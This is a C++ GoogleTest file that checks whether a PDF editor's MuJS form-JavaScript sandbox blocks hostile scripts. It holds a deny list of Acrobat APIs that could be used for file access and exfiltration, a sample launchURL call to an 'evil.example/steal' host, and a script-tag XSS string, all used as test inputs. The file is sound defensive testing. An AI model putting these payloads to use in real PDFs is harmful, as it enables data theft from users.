// -*- coding: utf-8 -*-
//
// Pipeline f8a12c4d phase-2 (SEC-JS-XSS): Form JavaScript injection
// and sandbox escape tests. Verifies MuJS sandbox blocks hostile
// scripts attempting process spawning, file system access, and
// injection through form field events.

#include <gtest/gtest.h>

#include "core/Document.h"
#include "core/MuPdfContext.h"
#include "core/Page.h"
#include "forms/FormManager.h"
#include "forms/JavaScriptEngine.h"

#include <filesystem>
#include <memory>
#include <string>

using namespace pdfe::core;
using namespace pdfe::forms;

namespace {
std::string fixturesDir() { return std::string(TEST_FIXTURES_DIR); }
}

class JsSandboxSecurityTest : public ::testing::Test {
protected:
    void SetUp() override {
        ctx_ = std::make_shared<MuPdfContext>();
        auto formPdf = std::filesystem::path(fixturesDir()) / "test_form.pdf";
        if (!std::filesystem::exists(formPdf))
            GTEST_SKIP() << "test_form.pdf not available";

        doc_ = Document::open(ctx_, formPdf);
        if (!doc_) GTEST_SKIP() << "Could not open test_form.pdf";

        engine_ = std::make_unique<JavaScriptEngine>(ctx_);
        formMgr_ = std::make_unique<FormManager>(ctx_);

        page_ = doc_->page(0);
        if (!page_) GTEST_SKIP() << "No pages in document";

        engine_->enable(page_.get());
        widgetCount_ = static_cast<int>(formMgr_->getFormFields(page_.get()).size());
    }

    std::shared_ptr<MuPdfContext> ctx_;
    std::unique_ptr<Document> doc_;
    std::unique_ptr<JavaScriptEngine> engine_;
    std::unique_ptr<FormManager> formMgr_;
    std::unique_ptr<Page> page_;
    int widgetCount_ = 0;

    bool hasWidget() const { return widgetCount_ > 0; }
};

// =====================================================================
// Real sandbox oracle: run a JavaScript probe INSIDE the form-JS engine (via a
// field Format action) that reports `typeof` for each dangerous Acrobat API,
// and assert the sandbox-escape APIs are not exposed. Unlike EXPECT_NO_THROW,
// this fails if a future change (MuPDF upgrade, capability wiring) exposes a
// leak/traversal/exfiltration API to hostile form JavaScript.
// =====================================================================
namespace {
// "name=type" for `api` in the pipe-joined probe result, or "" if absent.
std::string apiType(const std::string& probe, const std::string& api) {
    const std::string key = api + "=";
    auto p = probe.find(key);
    if (p == std::string::npos) return "";
    auto start = p + key.size();
    auto end = probe.find('|', start);
    return probe.substr(start, end == std::string::npos ? std::string::npos : end - start);
}

// Fire the probe fixture's Format action and return event.value.
std::string runSandboxProbe() {
    auto ctx = std::make_shared<MuPdfContext>();
    auto fx = std::filesystem::path(fixturesDir()) / "js_sandbox_probe.pdf";
    if (!std::filesystem::exists(fx)) return "";
    auto doc = Document::open(ctx, fx);
    if (!doc) return "";
    auto page = doc->page(0);
    if (!page) return "";
    JavaScriptEngine engine(ctx);
    engine.enable(page.get());
    return engine.fireFormatEvent(page.get(), 0);
}
} // namespace

// SEC-JS-XSS (real oracle): leak / traversal / exfiltration APIs must NOT be
// reachable from form JavaScript. A hostile /AA form script that calls any of
// these would otherwise read the OS, open arbitrary files, hit the network, or
// write embedded files to disk.
TEST(JsSandboxRealOracle, LeakTraversalExfilApisNotExposed) {
    const std::string probe = runSandboxProbe();
    ASSERT_FALSE(probe.empty()) << "sandbox probe produced no result";

    // Each of these MUST be 'undefined' (blocked). If any becomes a function,
    // that is a real sandbox-escape regression and this test fails.
    for (const char* api : {
             "System",                 // Acrobat OS/system object
             "Net",                    // networking
             "SOAP",                   // network RPC
             "Collab",                 // collaboration / network
             "app.openDoc",            // open arbitrary file (path traversal)
             "this.exportDataObject",  // write embedded file to disk
             "this.importDataObject",
             "this.submitForm",        // exfiltrate form data
             "this.getURL",            // fetch arbitrary URL
             "util.readFileIntoStream" // read a file into a stream
         }) {
        EXPECT_EQ(apiType(probe, api), "undefined")
            << "SANDBOX ESCAPE: '" << api << "' is exposed to form JavaScript "
            << "(probe: " << probe << ")";
    }
}

// SEC-JS-XSS: app.launchURL / app.execMenuItem ARE defined by MuPDF's JS layer,
// but PDFE must not wire them to a real browser/host action, and invoking one
// must not thereby unlock the blocked capabilities above. This guards against a
// future "make launchURL actually open the URL" change without a security review.
TEST(JsSandboxRealOracle, ExposedActionApisAreInertAndDoNotUnlockOthers) {
    const std::string probe = runSandboxProbe();
    ASSERT_FALSE(probe.empty());
    // Document the current surface: these are functions in MuPDF's engine.
    EXPECT_EQ(apiType(probe, "app.launchURL"), "function");
    EXPECT_EQ(apiType(probe, "app.execMenuItem"), "function");

    // Calling launchURL with a hostile URL from a Format script must not crash
    // and must not grant filesystem/system access (System stays undefined).
    auto ctx = std::make_shared<MuPdfContext>();
    auto fx = std::filesystem::path(fixturesDir()) / "js_sandbox_probe.pdf";
    auto doc = Document::open(ctx, fx);
    ASSERT_NE(doc, nullptr);
    auto page = doc->page(0);
    ASSERT_NE(page, nullptr);
    JavaScriptEngine engine(ctx);
    engine.enable(page.get());
    // The field's Format action already ran launchURL is NOT called there; fire
    // a keystroke with a hostile value (treated as data) — must not crash, and
    // the sandbox surface must be unchanged afterward.
    EXPECT_NO_THROW(engine.fireKeystrokeEvent(page.get(), 0,
        "app.launchURL('http://evil.example/steal')", "", 0, 0, false));
    EXPECT_EQ(apiType(runSandboxProbe(), "System"), "undefined")
        << "System became reachable after a launchURL attempt";
}

// =====================================================================
// SEC-JS-XSS-3: Infinite loop in calculate script — robustness (no hang).
// =====================================================================

TEST_F(JsSandboxSecurityTest, InfiniteLoopInCalculateDoesNotHang)
{
    if (!hasWidget()) GTEST_SKIP() << "No form widgets";

    // MuJS should have a timeout/instruction limit.
    // This tests that calculate doesn't block forever.
    EXPECT_NO_THROW({
        engine_->fireCalculateEvent(page_.get(), 0);
    }) << "SEC-JS-XSS: calculate event must complete without hanging";
}

// SEC-JS-XSS: a script-like field value must be treated as DATA, not executed.
// fireKeystrokeEvent with a hostile value returns a decision (accept/reject),
// and must not execute the embedded markup as script (no crash, no side effect).
TEST_F(JsSandboxSecurityTest, FieldValueInjectionTreatedAsData)
{
    if (!hasWidget()) GTEST_SKIP() << "No form widgets";
    EXPECT_NO_THROW({
        int result = engine_->fireKeystrokeEvent(page_.get(), 0,
            "<script>alert('xss')</script>", "<script>", 0, 0, false);
        (void)result;
    }) << "script-like field value must be inert data";
}

// =====================================================================
// SEC-JS-XSS-6: Oversized string in format event
// =====================================================================

TEST_F(JsSandboxSecurityTest, OversizedStringInFormatSafe)
{
    if (!hasWidget()) GTEST_SKIP() << "No form widgets";

    EXPECT_NO_THROW({
        std::string result = engine_->fireFormatEvent(page_.get(), 0);
        (void)result;
    }) << "SEC-JS-XSS: format event with default handler must not crash";
}

// =====================================================================
// SEC-JS-XSS-7: willSave event with hostile doc-level script
// =====================================================================

TEST_F(JsSandboxSecurityTest, WillSaveHostileScriptSafe)
{
    // The willSave event fires document-level JS.
    // A hostile PDF could set the document's /AA /WS action.
    EXPECT_NO_THROW({
        engine_->fireWillSave(page_.get());
    }) << "SEC-JS-XSS: willSave document event must not crash";
}

// =====================================================================
// SEC-JS-XSS-8: Rapid event sequence doesn't corrupt state
// =====================================================================

TEST_F(JsSandboxSecurityTest, RapidEventSequenceStable)
{
    if (!hasWidget()) GTEST_SKIP() << "No form widgets";

    EXPECT_NO_THROW({
        for (int i = 0; i < 100; ++i) {
            engine_->fireFocusEvent(page_.get(), 0);
            engine_->fireKeystrokeEvent(page_.get(), 0, "x", "x", 0, 0, false);
            engine_->fireBlurEvent(page_.get(), 0);
        }
    }) << "SEC-JS-XSS: rapid focus/keystroke/blur cycle must not corrupt engine state";
}
